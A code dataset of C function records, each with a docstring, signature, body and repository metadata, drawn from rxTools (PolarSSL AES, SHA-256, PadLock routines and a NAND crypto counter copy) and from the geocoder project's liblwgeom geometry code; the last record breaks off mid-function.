{"docstring": "/*\n * AES-ECB block encryption/decryption\n */\n", "func_signal": "int aes_crypt_ecb( aes_context *ctx,\n                    int mode,\n                    const unsigned char input[16],\n                    unsigned char output[16] )", "code": "{\n    int i;\n    uint32_t *RK, X0, X1, X2, X3, Y0, Y1, Y2, Y3;\n\n#if defined(POLARSSL_PADLOCK_C) && defined(POLARSSL_HAVE_X86)\n    if( aes_padlock_ace )\n    {\n        if( padlock_xcryptecb( ctx, mode, input, output ) == 0 )\n            return( 0 );\n\n        // If padlock data misaligned, we just fall back to\n        // unaccelerated mode\n        //\n    }\n#endif\n\n    RK = ctx->rk;\n\n    GET_UINT32_LE( X0, input,  0 ); X0 ^= *RK++;\n    GET_UINT32_LE( X1, input,  4 ); X1 ^= *RK++;\n    GET_UINT32_LE( X2, input,  8 ); X2 ^= *RK++;\n    GET_UINT32_LE( X3, input, 12 ); X3 ^= *RK++;\n\n    if( mode == AES_DECRYPT )\n    {\n        for( i = (ctx->nr >> 1) - 1; i > 0; i-- )\n        {\n            AES_RROUND( Y0, Y1, Y2, Y3, X0, X1, X2, X3 );\n            AES_RROUND( X0, X1, X2, X3, Y0, Y1, Y2, Y3 );\n        }\n\n        AES_RROUND( Y0, Y1, Y2, Y3, X0, X1, X2, X3 );\n\n        X0 = *RK++ ^ \\\n                ( (uint32_t) RSb[ ( Y0       ) & 0xFF ]       ) ^\n                ( (uint32_t) RSb[ ( Y3 >>  8 ) & 0xFF ] <<  8 ) ^\n                ( (uint32_t) RSb[ ( Y2 >> 16 ) & 0xFF ] << 16 ) ^\n                ( (uint32_t) RSb[ ( Y1 >> 24 ) & 0xFF ] << 24 );\n\n        X1 = *RK++ ^ \\\n                ( (uint32_t) RSb[ ( Y1       ) & 0xFF ]       ) ^\n                ( (uint32_t) RSb[ ( Y0 >>  8 ) & 0xFF ] <<  8 ) ^\n                ( (uint32_t) RSb[ ( Y3 >> 16 ) & 0xFF ] << 16 ) ^\n                ( (uint32_t) RSb[ ( Y2 >> 24 ) & 0xFF ] << 24 );\n\n        X2 = *RK++ ^ \\\n                ( (uint32_t) RSb[ ( Y2       ) & 0xFF ]       ) ^\n                ( (uint32_t) RSb[ ( Y1 >>  8 ) & 0xFF ] <<  8 ) ^\n                ( (uint32_t) RSb[ ( Y0 >> 16 ) & 0xFF ] << 16 ) ^\n                ( (uint32_t) RSb[ ( Y3 >> 24 ) & 0xFF ] << 24 );\n\n        X3 = *RK++ ^ \\\n                ( (uint32_t) RSb[ ( Y3       ) & 0xFF ]       ) ^\n                ( (uint32_t) RSb[ ( Y2 >>  8 ) & 0xFF ] <<  8 ) ^\n                ( (uint32_t) RSb[ ( Y1 >> 16 ) & 0xFF ] << 16 ) ^\n                ( (uint32_t) RSb[ ( Y0 >> 24 ) & 0xFF ] << 24 );\n    }\n    else /* AES_ENCRYPT */\n    {\n        for( i = (ctx->nr >> 1) - 1; i > 0; i-- )\n        {\n            AES_FROUND( Y0, Y1, Y2, Y3, X0, X1, X2, X3 );\n            AES_FROUND( X0, X1, X2, X3, Y0, Y1, Y2, Y3 );\n        }\n\n        AES_FROUND( Y0, Y1, Y2, Y3, X0, X1, X2, X3 );\n\n        X0 = *RK++ ^ \\\n                ( (uint32_t) FSb[ ( Y0       ) & 0xFF ]       ) ^\n                ( (uint32_t) FSb[ ( Y1 >>  8 ) & 0xFF ] <<  8 ) ^\n                ( (uint32_t) FSb[ ( Y2 >> 16 ) & 0xFF ] << 16 ) ^\n                ( (uint32_t) FSb[ ( Y3 >> 24 ) & 0xFF ] << 24 );\n\n        X1 = *RK++ ^ \\\n                ( (uint32_t) FSb[ ( Y1       ) & 0xFF ]       ) ^\n                ( (uint32_t) FSb[ ( Y2 >>  8 ) & 0xFF ] <<  8 ) ^\n                ( (uint32_t) FSb[ ( Y3 >> 16 ) & 0xFF ] << 16 ) ^\n                ( (uint32_t) FSb[ ( Y0 >> 24 ) & 0xFF ] << 24 );\n\n        X2 = *RK++ ^ \\\n                ( (uint32_t) FSb[ ( Y2       ) & 0xFF ]       ) ^\n                ( (uint32_t) FSb[ ( Y3 >>  8 ) & 0xFF ] <<  8 ) ^\n                ( (uint32_t) FSb[ ( Y0 >> 16 ) & 0xFF ] << 16 ) ^\n                ( (uint32_t) FSb[ ( Y1 >> 24 ) & 0xFF ] << 24 );\n\n        X3 = *RK++ ^ \\\n                ( (uint32_t) FSb[ ( Y3       ) & 0xFF ]       ) ^\n                ( (uint32_t) FSb[ ( Y0 >>  8 ) & 0xFF ] <<  8 ) ^\n                ( (uint32_t) FSb[ ( Y1 >> 16 ) & 0xFF ] << 16 ) ^\n                ( (uint32_t) FSb[ ( Y2 >> 24 ) & 0xFF ] << 24 );\n    }\n\n    PUT_UINT32_LE( X0, output,  0 );\n    PUT_UINT32_LE( X1, output,  4 );\n    PUT_UINT32_LE( X2, output,  8 );\n    PUT_UINT32_LE( X3, output, 12 );\n\n    return( 0 );\n}", "path": "rxtools\\source\\lib\\polarssl\\aes.c", "repo_name": "roxas75/rxTools", "stars": 264, "license": "gpl-2.0", "language": "c", "size": 50389}
{"docstring": "/*\n * PadLock detection routine\n */\n", "func_signal": "int padlock_supports( int feature )", "code": "{\n    static int flags = -1;\n    int ebx, edx;\n\n    if( flags == -1 )\n    {\n        __asm__( \"movl  %%ebx, %0           \\n\"     \\\n             \"movl  $0xC0000000, %%eax  \\n\"     \\\n             \"cpuid                     \\n\"     \\\n             \"cmpl  $0xC0000001, %%eax  \\n\"     \\\n             \"movl  $0, %%edx           \\n\"     \\\n             \"jb    unsupported         \\n\"     \\\n             \"movl  $0xC0000001, %%eax  \\n\"     \\\n             \"cpuid                     \\n\"     \\\n             \"unsupported:              \\n\"     \\\n             \"movl  %%edx, %1           \\n\"     \\\n             \"movl  %2, %%ebx           \\n\"\n             : \"=m\" (ebx), \"=m\" (edx)\n             :  \"m\" (ebx)\n             : \"eax\", \"ecx\", \"edx\" );\n\n        flags = edx;\n    }\n\n    return( flags & feature );\n}", "path": "rxtools\\source\\lib\\polarssl\\padlock.c", "repo_name": "roxas75/rxTools", "stars": 264, "license": "gpl-2.0", "language": "c", "size": 50389}
{"docstring": "/*\n * AES-CTR buffer encryption/decryption\n */\n", "func_signal": "int aes_crypt_ctr( aes_context *ctx,\n                       size_t length,\n                       size_t *nc_off,\n                       unsigned char nonce_counter[16],\n                       unsigned char stream_block[16],\n                       const unsigned char *input,\n                       unsigned char *output )", "code": "{\n    int c, i;\n    size_t n = *nc_off;\n\n    while( length-- )\n    {\n        if( n == 0 ) {\n            aes_crypt_ecb( ctx, AES_ENCRYPT, nonce_counter, stream_block );\n\n            for( i = 16; i > 0; i-- )\n                if( ++nonce_counter[i - 1] != 0 )\n                    break;\n        }\n        c = *input++;\n        *output++ = (unsigned char)( c ^ stream_block[n] );\n\n        n = (n + 1) & 0x0F;\n    }\n\n    *nc_off = n;\n\n    return( 0 );\n}", "path": "rxtools\\source\\lib\\polarssl\\aes.c", "repo_name": "roxas75/rxTools", "stars": 264, "license": "gpl-2.0", "language": "c", "size": 50389}
{"docstring": "/*\n * AES-CFB128 buffer encryption/decryption\n */\n", "func_signal": "int aes_crypt_cfb128( aes_context *ctx,\n                       int mode,\n                       size_t length,\n                       size_t *iv_off,\n                       unsigned char iv[16],\n                       const unsigned char *input,\n                       unsigned char *output )", "code": "{\n    int c;\n    size_t n = *iv_off;\n\n    if( mode == AES_DECRYPT )\n    {\n        while( length-- )\n        {\n            if( n == 0 )\n                aes_crypt_ecb( ctx, AES_ENCRYPT, iv, iv );\n\n            c = *input++;\n            *output++ = (unsigned char)( c ^ iv[n] );\n            iv[n] = (unsigned char) c;\n\n            n = (n + 1) & 0x0F;\n        }\n    }\n    else\n    {\n        while( length-- )\n        {\n            if( n == 0 )\n                aes_crypt_ecb( ctx, AES_ENCRYPT, iv, iv );\n\n            iv[n] = *output++ = (unsigned char)( iv[n] ^ *input++ );\n\n            n = (n + 1) & 0x0F;\n        }\n    }\n\n    *iv_off = n;\n\n    return( 0 );\n}", "path": "rxtools\\source\\lib\\polarssl\\aes.c", "repo_name": "roxas75/rxTools", "stars": 264, "license": "gpl-2.0", "language": "c", "size": 50389}
{"docstring": "/*\n * SHA-256 final digest\n */\n", "func_signal": "void sha2_finish( sha2_context *ctx, unsigned char output[32] )", "code": "{\n    uint32_t last, padn;\n    uint32_t high, low;\n    unsigned char msglen[8];\n\n    high = ( ctx->total[0] >> 29 )\n         | ( ctx->total[1] <<  3 );\n    low  = ( ctx->total[0] <<  3 );\n\n    PUT_UINT32_BE( high, msglen, 0 );\n    PUT_UINT32_BE( low,  msglen, 4 );\n\n    last = ctx->total[0] & 0x3F;\n    padn = ( last < 56 ) ? ( 56 - last ) : ( 120 - last );\n\n    sha2_update( ctx, sha2_padding, padn );\n    sha2_update( ctx, msglen, 8 );\n\n    PUT_UINT32_BE( ctx->state[0], output,  0 );\n    PUT_UINT32_BE( ctx->state[1], output,  4 );\n    PUT_UINT32_BE( ctx->state[2], output,  8 );\n    PUT_UINT32_BE( ctx->state[3], output, 12 );\n    PUT_UINT32_BE( ctx->state[4], output, 16 );\n    PUT_UINT32_BE( ctx->state[5], output, 20 );\n    PUT_UINT32_BE( ctx->state[6], output, 24 );\n\n    if( ctx->is224 == 0 )\n        PUT_UINT32_BE( ctx->state[7], output, 28 );\n}", "path": "rxtools\\source\\lib\\polarssl\\sha2.c", "repo_name": "roxas75/rxTools", "stars": 264, "license": "gpl-2.0", "language": "c", "size": 50389}
{"docstring": "/*\n * PadLock AES-CBC buffer en(de)cryption\n */\n", "func_signal": "int padlock_xcryptcbc( aes_context *ctx,\n                       int mode,\n                       size_t length,\n                       unsigned char iv[16],\n                       const unsigned char *input,\n                       unsigned char *output )", "code": "{\n    int ebx;\n    size_t count;\n    uint32_t *rk;\n    uint32_t *iw;\n    uint32_t *ctrl;\n    unsigned char buf[256];\n\n    if( ( (long) input  & 15 ) != 0 ||\n        ( (long) output & 15 ) != 0 )\n        return( POLARSSL_ERR_PADLOCK_DATA_MISALIGNED );\n\n    rk = ctx->rk;\n    iw = PADLOCK_ALIGN16( buf );\n    memcpy( iw, iv, 16 );\n\n     ctrl = iw + 4;\n    *ctrl = 0x80 | ctx->nr | ( ( ctx->nr + (mode^1) - 10 ) << 9 );\n\n    count = (length + 15) >> 4;\n\n    __asm__( \"pushfl; popfl         \\n\"     \\\n         \"movl    %%ebx, %0     \\n\"     \\\n         \"movl    %2, %%ecx     \\n\"     \\\n         \"movl    %3, %%edx     \\n\"     \\\n         \"movl    %4, %%ebx     \\n\"     \\\n         \"movl    %5, %%esi     \\n\"     \\\n         \"movl    %6, %%edi     \\n\"     \\\n         \"movl    %7, %%eax     \\n\"     \\\n         \".byte  0xf3,0x0f,0xa7,0xd0\\n\" \\\n         \"movl    %1, %%ebx     \\n\"\n         : \"=m\" (ebx)\n         :  \"m\" (ebx), \"m\" (count), \"m\" (ctrl),\n            \"m\"  (rk), \"m\" (input), \"m\" (output), \"m\" (iw)\n         : \"eax\", \"ecx\", \"edx\", \"esi\", \"edi\" );\n\n    memcpy( iv, iw, 16 );\n\n    return( 0 );\n}", "path": "rxtools\\source\\lib\\polarssl\\padlock.c", "repo_name": "roxas75/rxTools", "stars": 264, "license": "gpl-2.0", "language": "c", "size": 50389}
{"docstring": "/*\n * SHA-256 HMAC final digest\n */\n", "func_signal": "void sha2_hmac_finish( sha2_context *ctx, unsigned char output[32] )", "code": "{\n    int is224, hlen;\n    unsigned char tmpbuf[32];\n\n    is224 = ctx->is224;\n    hlen = ( is224 == 0 ) ? 32 : 28;\n\n    sha2_finish( ctx, tmpbuf );\n    sha2_starts( ctx, is224 );\n    sha2_update( ctx, ctx->opad, 64 );\n    sha2_update( ctx, tmpbuf, hlen );\n    sha2_finish( ctx, output );\n\n    memset( tmpbuf, 0, sizeof( tmpbuf ) );\n}", "path": "rxtools\\source\\lib\\polarssl\\sha2.c", "repo_name": "roxas75/rxTools", "stars": 264, "license": "gpl-2.0", "language": "c", "size": 50389}
{"docstring": "/*\n * output = SHA-256( input buffer )\n */\n", "func_signal": "void sha2( const unsigned char *input, size_t ilen,\n           unsigned char output[32], int is224 )", "code": "{\n    sha2_context ctx;\n\n    sha2_starts( &ctx, is224 );\n    sha2_update( &ctx, input, ilen );\n    sha2_finish( &ctx, output );\n\n    memset( &ctx, 0, sizeof( sha2_context ) );\n}", "path": "rxtools\\source\\lib\\polarssl\\sha2.c", "repo_name": "roxas75/rxTools", "stars": 264, "license": "gpl-2.0", "language": "c", "size": 50389}
{"docstring": "/**Copy NAND Cypto to our region.*/\n", "func_signal": "void FSNandInitCrypto(void)", "code": "{\n\tuint8_t *ctrStart = findCounter();\n\tuint8_t *ctrStore = NANDCTR;\n\tuint8_t i = 16; //CTR length\n\tif (!ctrStart) { return; } //Avoid copying from NULL\n\tctrStart = ctrStart + 15;\n\t//The CTR is stored backwards in memory.\n\twhile (i --) { *(ctrStore++) = *(ctrStart--); }\n}", "path": "rxtools\\source\\lib\\media\\nand.c", "repo_name": "roxas75/rxTools", "stars": 264, "license": "gpl-2.0", "language": "c", "size": 50389}
{"docstring": "/*\n * AES key schedule (decryption)\n */\n", "func_signal": "int aes_setkey_dec( aes_context *ctx, const unsigned char *key, unsigned int keysize )", "code": "{\n    int i, j;\n    aes_context cty;\n    uint32_t *RK;\n    uint32_t *SK;\n    int ret;\n\n    switch( keysize )\n    {\n        case 128: ctx->nr = 10; break;\n        case 192: ctx->nr = 12; break;\n        case 256: ctx->nr = 14; break;\n        default : return( POLARSSL_ERR_AES_INVALID_KEY_LENGTH );\n    }\n\n#if defined(POLARSSL_PADLOCK_C) && defined(PADLOCK_ALIGN16)\n    if( aes_padlock_ace == -1 )\n        aes_padlock_ace = padlock_supports( PADLOCK_ACE );\n\n    if( aes_padlock_ace )\n        ctx->rk = RK = PADLOCK_ALIGN16( ctx->buf );\n    else\n#endif\n    ctx->rk = RK = ctx->buf;\n\n    ret = aes_setkey_enc( &cty, key, keysize );\n    if( ret != 0 )\n        return( ret );\n\n    SK = cty.rk + cty.nr * 4;\n\n    *RK++ = *SK++;\n    *RK++ = *SK++;\n    *RK++ = *SK++;\n    *RK++ = *SK++;\n\n    for( i = ctx->nr - 1, SK -= 8; i > 0; i--, SK -= 8 )\n    {\n        for( j = 0; j < 4; j++, SK++ )\n        {\n            *RK++ = RT0[ FSb[ ( *SK       ) & 0xFF ] ] ^\n                    RT1[ FSb[ ( *SK >>  8 ) & 0xFF ] ] ^\n                    RT2[ FSb[ ( *SK >> 16 ) & 0xFF ] ] ^\n                    RT3[ FSb[ ( *SK >> 24 ) & 0xFF ] ];\n        }\n    }\n\n    *RK++ = *SK++;\n    *RK++ = *SK++;\n    *RK++ = *SK++;\n    *RK++ = *SK++;\n\n    memset( &cty, 0, sizeof( aes_context ) );\n\n    return( 0 );\n}", "path": "rxtools\\source\\lib\\polarssl\\aes.c", "repo_name": "roxas75/rxTools", "stars": 264, "license": "gpl-2.0", "language": "c", "size": 50389}
{"docstring": "/*\n * Construct a new LWLINE.  points will *NOT* be copied\n * use SRID=-1 for unknown SRID (will have 8bit type's S = 0)\n */\n", "func_signal": "LWLINE *\nlwline_construct(int SRID, BOX2DFLOAT4 *bbox, POINTARRAY *points)", "code": "{\n\tLWLINE *result;\n\tresult = (LWLINE*) lwalloc(sizeof(LWLINE));\n\n        LWDEBUG(2, \"lwline_construct called.\");\n\n\tresult->type = lwgeom_makeType_full(\n\t\tTYPE_HASZ(points->dims),\n\t\tTYPE_HASM(points->dims),\n\t\t(SRID!=-1), LINETYPE,\n\t\t0);\n\n        LWDEBUGF(3, \"lwline_construct type=%d\", result->type);\n\n\tresult->SRID = SRID;\n\tresult->points = points;\n\tresult->bbox = bbox;\n\n\treturn result;\n}", "path": "src\\liblwgeom\\lwline.c", "repo_name": "geocommons/geocoder", "stars": 393, "license": "lgpl-3.0", "language": "c", "size": 6593}
{"docstring": "/* find length of this deserialized line */\n", "func_signal": "size_t\nlwline_serialize_size(LWLINE *line)", "code": "{\n\tsize_t size = 1;  /* type */\n\n\tLWDEBUG(2, \"lwline_serialize_size called\");\n\n\tif ( line->SRID != -1 ) size += 4; /* SRID */\n\tif ( line->bbox ) size += sizeof(BOX2DFLOAT4);\n\n\tsize += 4; /* npoints */\n\tsize += pointArray_ptsize(line->points)*line->points->npoints;\n\n\tLWDEBUGF(3, \"lwline_serialize_size returning %d\", size);\n\n\treturn size;\n}", "path": "src\\liblwgeom\\lwline.c", "repo_name": "geocommons/geocoder", "stars": 393, "license": "lgpl-3.0", "language": "c", "size": 6593}
{"docstring": "/* \n** Given a generic collection, extract and return just the desired types.\nLWGEOM *lwcollection_extract(const LWCOLLECTION *col, char type)\n{\n\tLWGEOM **extracted_geoms;\n\textracted_geoms = lwalloc(sizeof(void*)*col->ngeoms);\n\textracted_curgeom = 0;\n\tchar reqtype = TYPE_GETTYPE(type);\n\tfor ( i = 0; i < col->ngeoms; i++ ) \n\t{\n\tif( col->geoms[i] )\n\t\tchar geomtype = TYPE_GETTYPE(col->geoms[i]->type);\n\t\tif ( geomtype == reqtype )  {\n\t\t\textracted_geoms[extracted_curgeom] = col->geoms[i];\n\t\t\textracted_curgeom++;\n\t\t\tcontinue;\n\t\t}\n\t\telse {\n\t\t\tif ( geomtype == COLLECTIONTYPE ) {\n\t\t\t\tLWGEOM *colgeom;\n\t\t\t\tcolgeom = lwcollection_extract(col->geoms[i], type);\n\t\t\t\textracted_geoms[extracted_curgeom] = colgeom->geoms;\n\t\t\t\textracted_curgeom++;\n\t\t\t\tif( colgeom->bbox ) lwfree(colgeom->bbox);\n\t\t\t\tlwfree(colgeom);\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t}\nTODO: pramsey\n}\n*/\n", "func_signal": "void lwcollection_free(LWCOLLECTION *col)", "code": "{\n\tint i;\n\tif( col->bbox ) \n\t{\n\t\tlwfree(col->bbox);\n\t}\n\tfor ( i = 0; i < col->ngeoms; i++ ) \n\t{\n\t\tif( col->geoms[i] ) {\n\t\t\tswitch( TYPE_GETTYPE(col->geoms[i]->type) )\n\t\t\t{\n\t\t\t\tcase POINTTYPE:\n\t\t\t\t\tlwpoint_free((LWPOINT*)col->geoms[i]);\n\t\t\t\t\tbreak;\n\t\t\t\tcase LINETYPE:\n\t\t\t\t\tlwline_free((LWLINE*)col->geoms[i]);\n\t\t\t\t\tbreak;\n\t\t\t\tcase POLYGONTYPE:\n\t\t\t\t\tlwpoly_free((LWPOLY*)col->geoms[i]);\n\t\t\t\t\tbreak;\n\t\t\t\tcase MULTIPOINTTYPE:\n\t\t\t\t\tlwmpoint_free((LWMPOINT*)col->geoms[i]);\n\t\t\t\t\tbreak;\n\t\t\t\tcase MULTILINETYPE:\n\t\t\t\t\tlwmline_free((LWMLINE*)col->geoms[i]);\n\t\t\t\t\tbreak;\n\t\t\t\tcase MULTIPOLYGONTYPE:\n\t\t\t\t\tlwmpoly_free((LWMPOLY*)col->geoms[i]);\n\t\t\t\t\tbreak;\n\t\t\t\tcase COLLECTIONTYPE:\n\t\t\t\t\tlwcollection_free((LWCOLLECTION*)col->geoms[i]);\n\t\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n\tif( col->geoms ) \n\t{\n\t\tlwfree(col->geoms);\n\t}\n\tlwfree(col);\n\t\n}", "path": "src\\liblwgeom\\lwcollection.c", "repo_name": "geocommons/geocoder", "stars": 393, "license": "lgpl-3.0", "language": "c", "size": 6593}
{"docstring": "/*\n * given the LWGEOM serialized form (or a pointer into a muli* one)\n * construct a proper LWLINE.\n * serialized_form should point to the 8bit type format (with type = 2)\n * See serialized form doc\n */\n", "func_signal": "LWLINE *\nlwline_deserialize(uchar *serialized_form)", "code": "{\n\tuchar type;\n\tLWLINE *result;\n\tuchar *loc =NULL;\n\tuint32 npoints;\n\tPOINTARRAY *pa;\n\n\ttype = (uchar) serialized_form[0];\n\n\tif ( lwgeom_getType(type) != LINETYPE)\n\t{\n\t\tlwerror(\"lwline_deserialize: attempt to deserialize a line which is really a %s\", lwgeom_typename(type));\n\t\treturn NULL;\n\t}\n\n\tresult = (LWLINE*) lwalloc(sizeof(LWLINE)) ;\n\tresult->type = type;\n\n\tloc = serialized_form+1;\n\n\tif (lwgeom_hasBBOX(type))\n\t{\n\t\tLWDEBUG(3, \"lwline_deserialize: input has bbox\");\n\n\t\tresult->bbox = lwalloc(sizeof(BOX2DFLOAT4));\n\t\tmemcpy(result->bbox, loc, sizeof(BOX2DFLOAT4));\n\t\tloc += sizeof(BOX2DFLOAT4);\n\t}\n\telse\n\t{\n\t\tresult->bbox = NULL;\n\t\t/*lwnotice(\"line has NO bbox\"); */\n\t}\n\n\tif ( lwgeom_hasSRID(type))\n\t{\n\t\t/*lwnotice(\"line has srid\"); */\n\t\tresult->SRID = lw_get_int32(loc);\n\t\tloc +=4; /* type + SRID */\n\t}\n\telse\n\t{\n\t\t/*lwnotice(\"line has NO srid\"); */\n\t\tresult->SRID = -1;\n\t}\n\n\t/* we've read the type (1 byte) and SRID (4 bytes, if present) */\n\n\tnpoints = lw_get_uint32(loc);\n\t/*lwnotice(\"line npoints = %d\", npoints); */\n\tloc +=4;\n\tpa = pointArray_construct(loc, TYPE_HASZ(type), TYPE_HASM(type), npoints);\n\tresult->points = pa;\n\n\treturn result;\n}", "path": "src\\liblwgeom\\lwline.c", "repo_name": "geocommons/geocoder", "stars": 393, "license": "lgpl-3.0", "language": "c", "size": 6593}
{"docstring": "/* Expand given box of 'd' units in all directions */\n", "func_signal": "void\nexpand_box2d(BOX2DFLOAT4 *box, double d)", "code": "{\n\tbox->xmin -= d;\n\tbox->ymin -= d;\n\n\tbox->xmax += d;\n\tbox->ymax += d;\n}", "path": "src\\liblwgeom\\box2d.c", "repo_name": "geocommons/geocoder", "stars": 393, "license": "lgpl-3.0", "language": "c", "size": 6593}
{"docstring": "/*\n * Clone LWCOLLECTION object. POINTARRAY are not copied.\n * Bbox is cloned if present in input.\n */\n", "func_signal": "LWCOLLECTION *\nlwcollection_clone(const LWCOLLECTION *g)", "code": "{\n\tuint32 i;\n\tLWCOLLECTION *ret = lwalloc(sizeof(LWCOLLECTION));\n\tmemcpy(ret, g, sizeof(LWCOLLECTION));\n\tif ( g->ngeoms > 0 )\n\t{\n\t\tret->geoms = lwalloc(sizeof(LWGEOM *)*g->ngeoms);\n\t\tfor (i=0; i<g->ngeoms; i++)\n\t\t{\n\t\t\tret->geoms[i] = lwgeom_clone(g->geoms[i]);\n\t\t}\n\t\tif ( g->bbox ) ret->bbox = box2d_clone(g->bbox);\n\t}\n\telse\n\t{\n\t\tret->bbox = NULL; /* empty collection */\n\t\tret->geoms = NULL;\n\t}\n\treturn ret;\n}", "path": "src\\liblwgeom\\lwcollection.c", "repo_name": "geocommons/geocoder", "stars": 393, "license": "lgpl-3.0", "language": "c", "size": 6593}
{"docstring": "/*\n * convert this line into its serialize form\n * result's first char will be the 8bit type.  See serialized form doc\n */\n", "func_signal": "uchar *\nlwline_serialize(LWLINE *line)", "code": "{\n\tsize_t size, retsize;\n\tuchar * result;\n\n\tif (line == NULL) lwerror(\"lwline_serialize:: given null line\");\n\n\tsize = lwline_serialize_size(line);\n\tresult = lwalloc(size);\n\tlwline_serialize_buf(line, result, &retsize);\n\n\tif ( retsize != size )\n\t{\n\t\tlwerror(\"lwline_serialize_size returned %d, ..serialize_buf returned %d\", size, retsize);\n\t}\n\n\treturn result;\n}", "path": "src\\liblwgeom\\lwline.c", "repo_name": "geocommons/geocoder", "stars": 393, "license": "lgpl-3.0", "language": "c", "size": 6593}
{"docstring": "/*\n * convert this collectoin into its serialize form writing it into\n * the given buffer, and returning number of bytes written into\n * the given int pointer.\n */\n", "func_signal": "void\nlwcollection_serialize_buf(LWCOLLECTION *coll, uchar *buf, size_t *retsize)", "code": "{\n\tsize_t size=1; /* type  */\n\tsize_t subsize=0;\n\tchar hasSRID;\n\tuchar *loc;\n\tint i;\n\n\tLWDEBUGF(2, \"lwcollection_serialize_buf called (%s with %d elems)\",\n\t\tlwgeom_typename(TYPE_GETTYPE(coll->type)), coll->ngeoms);\n\n\thasSRID = (coll->SRID != -1);\n\n\tbuf[0] = lwgeom_makeType_full(\n\t\tTYPE_HASZ(coll->type), TYPE_HASM(coll->type),\n\t\thasSRID, TYPE_GETTYPE(coll->type), coll->bbox ? 1 : 0);\n\tloc = buf+1;\n\n\t/* Add BBOX if requested */\n\tif ( coll->bbox )\n\t{\n\t\tmemcpy(loc, coll->bbox, sizeof(BOX2DFLOAT4));\n\t\tsize += sizeof(BOX2DFLOAT4);\n\t\tloc += sizeof(BOX2DFLOAT4);\n\t}\n\n\t/* Add SRID if requested */\n\tif (hasSRID)\n\t{\n\t\tmemcpy(loc, &coll->SRID, 4);\n\t\tsize += 4; \n\t\tloc += 4;\n\t}\n\n\t/* Write number of subgeoms */\n\tmemcpy(loc, &coll->ngeoms, 4);\n\tsize += 4;\n\tloc += 4;\n\n\t/* Serialize subgeoms */\n\tfor (i=0; i<coll->ngeoms; i++)\n\t{\n\t\tlwgeom_serialize_buf(coll->geoms[i], loc, &subsize);\n\t\tsize += subsize;\n\t\tloc += subsize;\n\t}\n\n\tif (retsize) *retsize = size;\n\n\tLWDEBUG(3, \"lwcollection_serialize_buf returning\");\n}", "path": "src\\liblwgeom\\lwcollection.c", "repo_name": "geocommons/geocoder", "stars": 393, "license": "lgpl-3.0", "language": "c", "size": 6593}
{"docstring": "/*\n * Add 'what' to this string at position 'where'\n * where=0 == prepend\n * where=-1 == append\n * Returns a COMPOUND or a GEOMETRYCOLLECTION\n */\n", "func_signal": "LWGEOM *\nlwcompound_add(const LWCOMPOUND *to, uint32 where, const LWGEOM *what)", "code": "{\n        LWCOLLECTION *col;\n        LWGEOM **geoms;\n        int newtype;\n\n        LWDEBUG(2, \"lwcompound_add called.\");\n\n        if(where != -1 && where != 0)\n        {\n                lwerror(\"lwcompound_add only supports 0 or -1 as a second argument, not %d\", where);\n                return NULL;\n        }\n\n        /* dimensions compatibility are checked by caller */\n\n        /* Construct geoms array */\n        geoms = lwalloc(sizeof(LWGEOM *)*2);\n        if(where == -1) /* append */\n        {\n                geoms[0] = lwgeom_clone((LWGEOM *)to);\n                geoms[1] = lwgeom_clone(what);\n        }\n        else /* prepend */\n        {\n                geoms[0] = lwgeom_clone(what);\n                geoms[1] = lwgeom_clone((LWGEOM *)to);\n        }\n\n        /* reset SRID and wantbbox flag from component types */\n        geoms[0]->SRID = geoms[1]->SRID = -1;\n        TYPE_SETHASSRID(geoms[0]->type, 0);\n        TYPE_SETHASSRID(geoms[1]->type, 0);\n        TYPE_SETHASBBOX(geoms[0]->type, 0);\n        TYPE_SETHASBBOX(geoms[1]->type, 0);\n\n        /* Find appropriate geom type */\n        if(TYPE_GETTYPE(what->type) == LINETYPE || TYPE_GETTYPE(what->type) == CIRCSTRINGTYPE) newtype = COMPOUNDTYPE;\n        else newtype = COLLECTIONTYPE;\n\n        col = lwcollection_construct(newtype,\n                to->SRID, NULL, 2, geoms);\n\n        return (LWGEOM *)col;\n}", "path": "src\\liblwgeom\\lwcompound.c", "repo_name": "geocommons/geocoder", "stars": 393, "license": "lgpl-3.0", "language": "c", "size": 6593}
{"docstring": "/* Clone LWLINE object. POINTARRAY is not copied. */\n", "func_signal": "LWLINE *\nlwline_clone(const LWLINE *g)", "code": "{\n\tLWLINE *ret = lwalloc(sizeof(LWLINE));\n       \n\tLWDEBUGF(2, \"lwline_clone called with %p\", g);\n\n\tmemcpy(ret, g, sizeof(LWLINE));\n\tif ( g->bbox ) ret->bbox = box2d_clone(g->bbox);\n\treturn ret;\n}", "path": "src\\liblwgeom\\lwline.c", "repo_name": "geocommons/geocoder", "stars": 393, "license": "lgpl-3.0", "language": "c", "size": 6593}
{"docstring": "/*\n * convert this line into its serialize form writing it into\n * the given buffer, and returning number of bytes written into\n * the given int pointer.\n * result's first char will be the 8bit type.  See serialized form doc\n */\n", "func_signal": "void\nlwline_serialize_buf(LWLINE *line, uchar *buf, size_t *retsize)", "code": "{\n\tchar hasSRID;\n\tuchar *loc;\n\tint ptsize;\n\tsize_t size;\n\n\tLWDEBUGF(2, \"lwline_serialize_buf(%p, %p, %p) called\",\n\t\tline, buf, retsize);\n\n\tif (line == NULL)\n\t\tlwerror(\"lwline_serialize:: given null line\");\n\n\tif ( TYPE_GETZM(line->type) != TYPE_GETZM(line->points->dims) )\n\t\tlwerror(\"Dimensions mismatch in lwline\");\n\n\tptsize = pointArray_ptsize(line->points);\n\n\thasSRID = (line->SRID != -1);\n\n\tbuf[0] = (uchar) lwgeom_makeType_full(\n\t\tTYPE_HASZ(line->type), TYPE_HASM(line->type),\n\t\thasSRID, LINETYPE, line->bbox ? 1 : 0);\n\tloc = buf+1;\n\n\tLWDEBUGF(3, \"lwline_serialize_buf added type (%d)\", line->type);\n\n\tif (line->bbox)\n\t{\n\t\tmemcpy(loc, line->bbox, sizeof(BOX2DFLOAT4));\n\t\tloc += sizeof(BOX2DFLOAT4);\n\n\t\tLWDEBUG(3, \"lwline_serialize_buf added BBOX\");\n\t}\n\n\tif (hasSRID)\n\t{\n\t\tmemcpy(loc, &line->SRID, sizeof(int32));\n\t\tloc += sizeof(int32);\n\n\t\tLWDEBUG(3, \"lwline_serialize_buf added SRID\");\n\t}\n\n\tmemcpy(loc, &line->points->npoints, sizeof(uint32));\n\tloc += sizeof(uint32);\n\n\tLWDEBUGF(3, \"lwline_serialize_buf added npoints (%d)\",\n\t\tline->points->npoints);\n\n\t/*copy in points */\n\tsize = line->points->npoints*ptsize;\n\tmemcpy(loc, getPoint_internal(line->points, 0), size);\n\tloc += size;\n\n\tLWDEBUGF(3, 